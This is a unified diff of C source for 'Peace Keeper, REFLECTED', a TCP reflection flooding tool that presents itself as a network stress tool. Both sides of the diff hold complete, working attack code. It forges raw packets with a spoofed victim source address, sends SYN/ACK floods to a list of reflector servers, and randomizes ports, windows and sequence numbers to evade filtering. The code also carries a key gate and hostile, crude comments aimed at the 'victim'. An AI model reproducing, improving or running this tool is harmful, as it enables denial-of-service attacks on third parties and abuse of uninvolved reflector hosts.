@@ -1,39 +1,53 @@
-/*                   .ed"""" """$$$$be.
-                   -"           ^""**$$$e.
-                 ."                   '$$$c
-                /                      "4$$b
-               d  3                      $$$$
-               $  *                   .$$$$$$
-              .$  ^c           $$$$$e$$$$$$$$.
-              d$L  4.         4$$$$$$$$$$$$$$b
-              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
-  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
- z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
-4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
-^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
-  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
-        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
-          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
-             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
-               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
-                  "$   "%*ebJLzb$e$$$$$b $P"
-                    %..      4$$$$$$$$$$ "
-                     $$$e   z$$$$$$$$$$%
-                      "*$c  "$$$$$$$P"
-                       ."""*$$$$$$$$bc
-                    .-"    .$***$$$"""*e.
-                 .-"    .e$"     "*$c  ^*b.
-          .=*""""    .e$*"          "*bc  "*$e..
-        .$"        .z*"               ^*$e.   "*****e.
-        $$ee$c   .d"                     "*$.        3.
-        ^*$E")$..$"                         *   .ee==d%
-           $.d$$$*                           *  J$$$e*
-            """""                              "$$$"
-
--:- Private Version -:-
-Peace Keeper: REFLECTED, A TCP/IPv4 network stress tool.
-The traditional way of keeping the peace amongst the crowd.
-By darkness@efnet (@tcphdr), greetz vae@efnet (@efnetsatan).
+/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
+                   -"           ^""**$$$e.                               2 = SYN
+                 ."                   '$$$c                              3 = FIN+SYN
+                /                      "4$$b                             4 = RST
+               d  3                      $$$$                            5 = RST+FIN
+               $  *                   .$$$$$$                            6 = RST+SYN
+              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
+              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
+              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
+  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
+ z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
+4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
+^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
+  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
+        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
+          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
+             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
+               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
+                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
+                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
+                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
+                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
+                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
+                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
+                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
+          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
+        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSY+SYN+FIN
+        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
+        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
+           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
+            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
+                                                                        32 = URGENT
+                                                                        63 = ACK+PUSH+RST+SYN+FIN+URG
+Peace Keeper, REFLECTED: A TCP/IP IPv4 network stress tool.             64 = Randomized flags set in an array.
+The traditional way of keeping the peace amongst the crowd.             65 = Digital Gangsta Stomper (special flags)
+By darkness@efnet, greetz vae@efnet
+Features:
+    - RFC-793 Pseudo Header for TCP packet forgery.
+    - Employs TCP reflection techniques on IPv4 networks.
+    - Randomized TCP windows.
+    - Randomized destination ports.
+    - Randomized TCP flag capabilities.
+    - Ephemeral port randomization.
+    - TCP flag input parsed as binary, any flag combination will work.
+    - Randomized TCP sequences.
+    - Randomized TCP acknowledgements.
+    - Randomized TTL or exact value via specification
+    - Window scaling.
+    - Randomized TSVal
+    - Readable code that is properly indented.
 */
 
 #include <stdio.h>
@@ -50,94 +64,126 @@ By darkness@efnet (@tcphdr), greetz vae@efnet (@efnetsatan).
 #include <arpa/inet.h>
 #include <netinet/tcp.h>
 #include <stdbool.h>
-#include <pthread.h>
 
-// Defines, don't fucking touch kthx.
-#define MAX_PACKET_LEN                8192          // Max packet size.
-#define RAND_PORT_MIN                 1             // Min TCP port randomization
-#define RAND_PORT_MAX                 65534         // Max TCP port randomization
-#define TCP_WINDOW_SIZE_MIN           1             // Min TCP window size.
-#define TCP_WINDOW_SIZE_MAX           65534         // Max TCP window size.
-#define TCP_TTL_MIN                   32            // Min TCP TTL length
-#define TCP_TTL_MAX                   255           // Max TCP TTL length
-#define TCP_DATA_LEN_MIN              0             // Min TCP data length
-#define TCP_DATA_LEN_MAX              1024          // Max TCP data length
-#define STRINGLEN                     64            // Leave it alone
-#define PHI                           0xaedc23      // Random Number Seed
-//#define DEBUG_TCP           
+#define PHI                           0xa31bc             // Number generation seed
+#define STRINGLEN                     64                  // DONT TOUCH FGT
+#define MAX_PACKET_LEN			      8192                // Max packet size.
+#define IP_RF                         0x8000              // reserved fragment flag 
+#define IP_DF                         0x4000              // dont fragment flag 
+#define IP_MF                         0x2000              // more fragments flag 
+#define IP_OFFMASK                    0x1fff              // mask for fragmenting bits 
+#define TCP_MODE_ACK                  1                   // Reflection mode 1 (ACK)
+#define TCP_MODE_SYN                  2                   // Reflection mode 2 (SYN)
+#define TCP_MODE_ACKSYN               3                   // Reflection mode 3 (ACK+SYN)
+#define EPHEMERAL_PORT_MIN            16383               // Min ephemeral TCP port randomization
+#define EPHEMERAL_PORT_MAX            49152               // Max ephemeral TCP port randomization
+#define RAND_PORT_MIN                 1                   // Min TCP port randomization
+#define RAND_PORT_MAX                 65534               // Max TCP port randomization
+#define TCP_WINDOW_SIZE_MIN           1                   // Min TCP window size.
+#define TCP_WINDOW_SIZE_MAX           65534               // Max TCP window size.
+#define TCP_TTL_MIN                   1                   // Min TCP TTL length
+#define TCP_TTL_MAX                   255                 // Max TCP TTL length
+#define TCP_DATA_LEN_MIN              0                   // Min TCP data length
+#define TCP_DATA_LEN_MAX              1024                // Max TCP data length
 
-// Variables and arrays.
 char datagram[MAX_PACKET_LEN] = { 0 };
-int rawsock = 0;
-static uint32_t Q[4096], c = 518267;
+static uint32_t Q[4096], c = 78512212;
 unsigned int start = 0;
-unsigned long long int packets = 0;
-unsigned short databytes = 0;
-unsigned int server_count = 0;
 unsigned int reflectorAddr = 0;
 unsigned short reflectorPort = 0;
 unsigned int pktcount = 0, pktsent = 0;
+unsigned long long int packets = 0;
+unsigned int server_count = 0;
+int rawsock = 0;
 
-// IP Packet Structure.
 struct ip
 {
-    unsigned int ip_hl : 5;         /* header length */
-    unsigned int ip_v : 4;          /* version */
-    unsigned char ip_tos;           /* type of service */
-    unsigned short ip_len;          /* total length */
-    unsigned short ip_id;           /* identification */
-    unsigned short ip_off;          /* fragment offset field */
-    unsigned char ip_ttl;           /* time to live */
-    unsigned char ip_p;             /* protocol */
-    unsigned short ip_sum;          /* checksum */
-    struct in_addr ip_src, ip_dst;  /* source and dest address */
+    unsigned int ip_hl : 4;              // header length 
+    unsigned int ip_v : 4;               // version 
+    unsigned char ip_tos;                // type of service 
+    unsigned short ip_len;               // total length 
+    unsigned short ip_id;                // identification 
+    unsigned short ip_off;               // fragment offset field 
+    unsigned char ip_ttl;                // time to live 
+    unsigned char ip_p;                  // protocol 
+    unsigned short ip_sum;               // checksum 
+    struct in_addr ip_src, ip_dst;       // source and dest address 
 };
 
-// TCP Packet Structure.
 struct tcp
 {
-    unsigned short th_sport;        /* source port */
-    unsigned short th_dport;        /* destination port */
-    unsigned int th_seq;            /* sequence number */
-    unsigned int th_ack;            /* acknowledgement number */
-    unsigned char th_x2 : 4;        /* (unused) */
-    unsigned char th_off : 4;       /* data offset */
-    unsigned char th_flags;         /* flags */
-    unsigned short th_len;          /* tcp length */
-    unsigned int th_proto;          /* protocol */
-    unsigned short th_win;          /* window */
-    unsigned short th_sum;          /* checksum */
-    unsigned short th_urp;          /* urgent pointer */
-    struct in_addr th_src, th_dst; /* src and dst ips for pseudo header */
+    unsigned short th_sport;        // source port
+    unsigned short th_dport;        // destination port
+    unsigned int th_seq;            // sequence number
+    unsigned int th_ack;            // acknowledgement number
+    unsigned char th_x2 : 4;        // (unused field) 
+    unsigned char th_off : 4;       // TCP Offset
+    unsigned char th_flags;         // flags
+    unsigned short th_win;          // window
+    unsigned short th_sum;          // checksum
+    unsigned short th_urp;          // urgent pointer
 };
 
-unsigned short csum(unsigned short* ptr, int nbytes)
+struct reflector
 {
-    register long sum;
-    unsigned short oddbyte;
-    register short answer;
+    struct in_addr ip4_addr;
+    unsigned short dport;
+};
 
-    sum = 0;
-    while (nbytes > 1)
-    {
-        sum += *ptr++;
-        nbytes -= 2;
-    }
-    if (nbytes == 1)
-    {
-        oddbyte = 0;
-        *((u_char*)&oddbyte) = *(u_char*)ptr;
-        sum += oddbyte;
-    }
+// Assemble our headers
+struct ip* xf_iphdr = (struct ip*)datagram;
+struct tcp* xf_tcphdr = (struct tcp*)(sizeof(struct ip) + datagram);
+struct reflector* reflectors = NULL;
 
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum = sum + (sum >> 16);
-    answer = (short)~sum;
+unsigned int lookup(char* hostname)
+{
+    struct hostent* name;
+    unsigned int address;
 
-    return(answer);
+    if ((address = inet_addr(hostname)) != -1)
+        return address;
+    if ((name = gethostbyname(hostname)) == NULL)
+        return -1;
+
+    memcpy(&address, name->h_addr, name->h_length);
+    return address;
 }
 
-// Better number randomization function.
+unsigned short csum(unsigned short* addr, int len)
+{
+    int nleft = len;
+    unsigned int sum = 0;
+    unsigned short* w = addr;
+    unsigned short answer = 0;
+
+    while (nleft > 1)
+    {
+        sum += *w++;
+        nleft -= 2;
+    }
+    if (nleft == 1)
+    {
+        *(unsigned char*)(&answer) = *(unsigned char*)w;
+        sum += answer;
+    }
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    answer = ~sum;
+    return (answer);
+}
+
+void init_rand(uint32_t x)
+{
+    int i;
+
+    Q[0] = x;
+    Q[1] = x + PHI;
+    Q[2] = x + PHI + PHI;
+
+    for (i = 3; i < 4096; i++)
+        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+}
+
 uint32_t rand_cmwc(void)
 {
     uint64_t t, a = 18782LL;
@@ -155,26 +201,11 @@ uint32_t rand_cmwc(void)
     return (Q[i] = r - x);
 }
 
-unsigned int lookup(char* hostname)
+void handle_exit()
 {
-    struct hostent* name;
-    unsigned int address;
-
-    if ((address = inet_addr(hostname)) != -1)
-        return address;
-    if ((name = gethostbyname(hostname)) == NULL)
-        return -1;
-
-    memcpy(&address, name->h_addr, name->h_length);
-    return address;
+    printf("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
+    exit(0);
 }
-
-struct reflector
-{
-    struct in_addr ip4_addr;
-    unsigned short dport;
-};
-struct reflector* reflectors = NULL;
 
 struct reflector* read_servers(char* filename)
 {
@@ -239,228 +270,210 @@ struct reflector* read_servers(char* filename)
     return(reflectors);
 }
 
-// Seeding function for our rand number generator.
-void init_rand(uint32_t x)
-{
-    int i;
-
-    Q[0] = x;
-    Q[1] = x + PHI;
-    Q[2] = x + PHI + PHI;
-
-    for (i = 3; i < 4096; i++)
-        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
-}
-
-void handle_exit()
-{
-    printf("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec\n", packets, time(NULL) - start, packets / (time(NULL) - start));
-    exit(0);
-}
-
 void attack(unsigned int dest, unsigned short dstport, unsigned int mode, unsigned int ttime)
 {
-    unsigned int z = 1;
     struct sockaddr_in sin;
+    unsigned int z = 1;
 
-    // Assemble header.
-    struct ip* xf_iphdr = (struct ip*)datagram;
-    struct tcp* xf_tcphdr = (struct tcp*)(datagram + sizeof(struct ip));
+    // Iterate to a new reflector stored in our list.
+    reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
+    reflectorPort = htons(reflectors[z].dport);
 
-    // Tell the user about some bullshit taking place.
-    if (dstport == 0)
-        printf("-> Source Port Randomization [✔️]\n");
+    xf_iphdr->ip_dst.s_addr = reflectorAddr;
+    xf_tcphdr->th_dport = reflectorPort;
+    sin.sin_port = reflectorPort;
+    sin.sin_family = AF_INET; // set socket family
 
-    sin.sin_family = AF_INET;
-    xf_iphdr->ip_id = htons(rand_cmwc());
-    xf_iphdr->ip_p = IPPROTO_TCP;
+    // Calculate TCP offset.
+    xf_tcphdr->th_off = (sizeof(struct tcp)) / 4;
+
+    // Set TCP options accordingly based on what kind of reflection attack we're doing.
+    switch (mode)
+    {
+        case TCP_MODE_ACK:
+        {
+            xf_tcphdr->th_flags = 16;
+            break;
+        }
+        case TCP_MODE_SYN:
+        {
+            xf_tcphdr->th_flags = 2;
+            break;
+        }
+        case TCP_MODE_ACKSYN:
+        {
+            if (pktsent == 0)
+            {
+                xf_tcphdr->th_flags = 2;
+            }
+            else if (pktsent == 1)
+            {
+                xf_tcphdr->th_flags = 16;
+            }
+            break;
+        }
+    }
+
+    // Header shit
     xf_iphdr->ip_v = 4;
     xf_iphdr->ip_hl = 5;
     xf_iphdr->ip_tos = 0;
     xf_tcphdr->th_urp = 0;
+    xf_iphdr->ip_id = htons(rand_cmwc());
     xf_iphdr->ip_off = htons(0x4000);
+    xf_iphdr->ip_p = IPPROTO_TCP;
 
-    // Set TCP options accordingly based on what kind of reflection attack we're doing.
-    // pkt 1: ack=0 seq=rand
-    // pkt2: ack=rand seq=oldseq+1
+    // Set randomized SEQ and ACK
+    xf_tcphdr->th_ack = htonl(rand_cmwc());
+    xf_tcphdr->th_seq = htonl(rand_cmwc());
 
-    switch (mode)
-    {
-        case 1:
-        {
-            xf_tcphdr->th_flags = 2;
-            xf_tcphdr->th_seq = htonl(rand_cmwc());
-            xf_tcphdr->th_ack = htonl(0);
-            break;
-        }
-        case 2:
-        {
-            xf_tcphdr->th_flags = 16;
-            xf_tcphdr->th_seq = htonl(rand_cmwc());
-            xf_tcphdr->th_ack = htonl(rand_cmwc());
-        }
-    }
-    // Set victim address and port.
-    xf_iphdr->ip_src.s_addr = dest;
-    xf_tcphdr->th_src.s_addr = dest;
-    xf_tcphdr->th_sport = htons(dstport);
+    // Randomize TCP source port.
+    if (dstport == 0)
+        xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
 
-    // Set reflector and destination address and port.
-    reflectorAddr = reflectors[z].ip4_addr.s_addr;
-    reflectorPort = reflectors[z].dport;
-    xf_iphdr->ip_dst.s_addr = reflectorAddr;
-    xf_tcphdr->th_dst.s_addr = reflectorAddr;
-    xf_tcphdr->th_dport = reflectorPort;
-    sin.sin_port = reflectorPort;
+    // Randomize TCP window.
+    xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
 
-    // Calculate IP length
-    xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcp));
-
-    // Calculate TCP Length
-    xf_tcphdr->th_len = htons(sizeof(struct tcp));
-
-    // Calculate Offset
-    xf_tcphdr->th_off = sizeof(struct tcp) / 4;
-
-    // Randomize TCP window
-    xf_tcphdr->th_win = htons(65535);
-
-    // Set TTL
+    // larger ttls are also more evil 
     xf_iphdr->ip_ttl = TCP_TTL_MAX;
 
+    // The BITCH IP & PORT we're packeting.
+    xf_iphdr->ip_src.s_addr = dest;
+    xf_tcphdr->th_sport = htons(dstport);
+
+    // Calculate IP length
+    xf_iphdr->ip_len = (sizeof(struct ip) + sizeof(struct tcp));
+    xf_iphdr->ip_off = htons(0x4000);
+
     // Calculate TCP checksum
-    xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
-    xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
+    xf_tcphdr->th_sum = 0;
+    xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
 
-    // Set start time.
-    start = time(NULL);
-
-#ifdef DEBUG_TCP
-    printf("> IP HDR: %u\n", sizeof(struct ip));
-    printf("> TCP HDR: %u\n", sizeof(struct tcp));
-    printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp));
-#else
-    printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp));
-#endif
+    printf("-> TCP Packet Size: %zu\n", (sizeof(struct ip) + sizeof(struct tcp)));
 
     while (true)
     {
-        // Check for timeout.
-        if (time(NULL) - start >= ttime)
-            handle_exit();
-
-        // Reset reflector list if necessary.
+        // Restart from the beginning if we need to.
         if (z >= server_count)
-            z = 1, pktsent = 0;
+        {
+            z = 1;
+            pktsent = 0;
+        }
 
-        // Send the packet.
-        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp), 0, (struct sockaddr*)&sin, sizeof(sin)), packets++, pktsent++, z++;
+        // Have we reached our packet time yet?
+        if (time(NULL) - start >= ttime)
+        {
+            handle_exit();
+        }
+
+        // Logic for packets per host.
+        if (pktsent >= pktcount)
+        {
+            reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
+            reflectorPort = htons(reflectors[z].dport);
+            pktsent = 0;
+            z++;
+        }
+
+        // Set destination address and port.
+        xf_iphdr->ip_dst.s_addr = htonl(reflectorAddr);
+        sin.sin_addr.s_addr = htonl(reflectorAddr);
+        xf_tcphdr->th_dport = reflectorPort;
+        sin.sin_port = reflectorPort;
 
         // Set TCP options accordingly based on what kind of reflection attack we're doing.
-        // pkt 1: ack=0 seq=rand
-        // pkt2: ack=rand seq=oldseq+1
         switch (mode)
         {
-            case 1:
-            {
-                xf_tcphdr->th_flags = 2;
-                xf_tcphdr->th_seq = htonl(rand_cmwc());
-                xf_tcphdr->th_ack = htonl(0);
-                break;
-            }
-            case 2:
+            case TCP_MODE_ACK:
             {
                 xf_tcphdr->th_flags = 16;
-                xf_tcphdr->th_seq = htonl(rand_cmwc());
-                xf_tcphdr->th_ack = htonl(rand_cmwc());
                 break;
             }
-            case 3:
+            case TCP_MODE_SYN:
+            {
+                xf_tcphdr->th_flags = 2;
+                break;
+            }
+            case TCP_MODE_ACKSYN:
             {
                 if (pktsent == 0)
                 {
                     xf_tcphdr->th_flags = 2;
-                    xf_tcphdr->th_seq = htonl(rand_cmwc());
                 }
                 else if (pktsent == 1)
                 {
-                    pktsent = 0;
                     xf_tcphdr->th_flags = 16;
-                    xf_tcphdr->th_seq = htonl(xf_tcphdr->th_seq + 1);
-                    xf_tcphdr->th_ack = htonl(rand_cmwc());
                 }
                 break;
             }
         }
 
-        // Randomize source port if requested.
-        if (dstport == 0 && mode != 3)
+        // Set randomized IP ID
+        xf_iphdr->ip_id = htons(rand_cmwc());
+
+        // Set randomized SEQ and ACK
+        xf_tcphdr->th_ack = htonl(rand_cmwc());
+        xf_tcphdr->th_seq = htonl(rand_cmwc());
+
+        // Randomize TCP source port.
+        if (dstport == 0)
             xf_tcphdr->th_sport = htons(((rand_cmwc() % RAND_PORT_MAX) + RAND_PORT_MIN));
 
-        // Randomize TCP window
-       //xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
+        // Randomize TCP window.
+        xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
 
-        // Set reflector and destination address and port.
-        reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
-        reflectorPort = htons(reflectors[z].dport);
-        xf_iphdr->ip_dst.s_addr = reflectorAddr;
-        xf_tcphdr->th_dst.s_addr = reflectorAddr;
-        xf_tcphdr->th_dport = reflectorPort;
-        sin.sin_port = reflectorPort;
+        // Calculate IP length & offset
+        xf_iphdr->ip_len = (sizeof(struct ip) + sizeof(struct tcp));
+        xf_iphdr->ip_off = htons(0x4000);
 
-        // Calculate IP length.
-        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcp));
-
-        // Calculate TCP Length
-        xf_tcphdr->th_len = htons(sizeof(struct tcp));
-
-        // Calculate Offset
-        xf_tcphdr->th_off = sizeof(struct tcp) / 4;
+        // Calculate TCP offset
+        xf_tcphdr->th_off = (sizeof(struct tcp) / 4);
 
         // Calculate TCP checksum
-        xf_iphdr->ip_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
-        xf_tcphdr->th_sum = csum((unsigned short*)datagram, (sizeof(struct ip) + sizeof(struct tcp)));
+        xf_tcphdr->th_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
+        xf_iphdr->ip_sum = csum((unsigned short*)datagram, sizeof(struct ip) + sizeof(struct tcp));
 
-#ifdef DEBUG_TCP
-        printf("> Loop IP HDR: %u\n", sizeof(struct ip));
-        printf("> Loop TCP HDR: %u\n", sizeof(struct tcp));
-        printf("> TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcp));
-#endif
+        // Send the packet to the victim(s).
+        sendto(rawsock, datagram, sizeof(struct ip) + sizeof(struct tcp), 0, (struct sockaddr*)&sin, sizeof(sin));
+        packets++, pktsent++;
     }
 }
 
 int main(int argc, char** argv)
 {
-    char* listName = { 0 };
-    unsigned int dest = 0, ttime = 0;
-    unsigned short dstport = 0;
-    int tmp = 1, mode = 0;
+    unsigned int dest, ttime, mode;
+    unsigned short dstport, srcport, winsize;
+    char* listName;
+    int tmp = 1;
     const int* val = &tmp;
 
-    /* parse arguments */
-    if (argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "BB"))
+    // Seed number randomization features.
+    init_rand(time(NULL));
+
+    // Parse arguments
+    if (argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "29A"))
     {
         printf("-> Ah ah ah! You didn't say the magic word, deleting system file!\n");
         exit(0);
     }
     else
     {
-        if (argc < 6)
+        if (argc < 7)
         {
             printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper, REFLECTED.\n");
-            printf("USAGE : %s <key> <victim> <victim port> <list> <mode> <time>\n", argv[0]);
+            printf("USAGE : %s <key> <pkts-per-reflector> <dest> <destport> <list> <mode (1-3)> <time>\n", argv[0]);
             exit(0);
         }
     }
 
-    // Allocate Socket
+    // Allocate the socket
     rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (rawsock <= 0)
     {
-        printf("socket(): create failed, die.\n");
+        printf("Error opening raw socket\n");
         exit(-1);
     }
-
+   
     // Set socket information
     if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
     {
@@ -468,36 +481,52 @@ int main(int argc, char** argv)
         exit(-1);
     }
 
-    dest = lookup(argv[2]);
-    dstport = atoi(argv[3]);
-    listName = argv[4];
-    mode = atoi(argv[5]);
-    ttime = atoi(argv[6]);
+    // Parse input
+    pktcount = atoi(argv[2]);
+    dest = lookup(argv[3]);
+    dstport = atoi(argv[4]);
+    listName = argv[5];
+    mode = atoi(argv[6]);
+    ttime = atoi(argv[7]);
 
-    // Runtime sanity.
-    if (mode > 3 || mode < 0)
+    // Read list pl0x
+    reflectors = read_servers(listName);
+
+    // Sanity checking for reflectors.
+    if(pktcount >= 16)
     {
-        printf("Invalid mode given, die.\n");
+        printf("ERROR: packets per reflector too high (1-15)\n");
         exit(-1);
     }
-    // This is a cryptic way of saying the method won't work.
-    if (mode == 3 && dstport == 0)
+    // Sanity cecking for port
+    if(dstport < 0 || dstport > 65535)
     {
-        printf("Cannot have random src port when using mode 3, die.\n");
+        printf("-> Acceptable TCP destination ports are between 1 and 65535.\n");
         exit(-1);
     }
 
-    // Seed num generation code.
-    init_rand(time(NULL));
+    // Alert the user of what is taking place.
+    if (dstport == 0)
+        printf("-> Source Port Randomization [✔️] \n");
 
-    // Set signals.
+    switch (mode)
+    {
+        case TCP_MODE_ACK: printf("-> TCP Flag(s): ACK\n"); break;
+        case TCP_MODE_SYN: printf("-> TCP Flag(s): SYN\n"); break;
+        case TCP_MODE_ACKSYN: printf("-> TCP Flag(s): ACK+SYN\n"); pktcount = 2; break;
+        default:
+        {
+            printf("ERROR: Unknown mode, exit\n");
+            exit(-1);
+        }
+    }
+
+    // Set signals
     signal(SIGINT, handle_exit);
     signal(SIGTERM, handle_exit);
     signal(SIGQUIT, handle_exit);
 
-    // Read list.
-    reflectors = read_servers(listName);
-
-    // Call attack code.
+    // Call attack function
+    start = time(NULL);
     attack(dest, dstport, mode, ttime);
 }
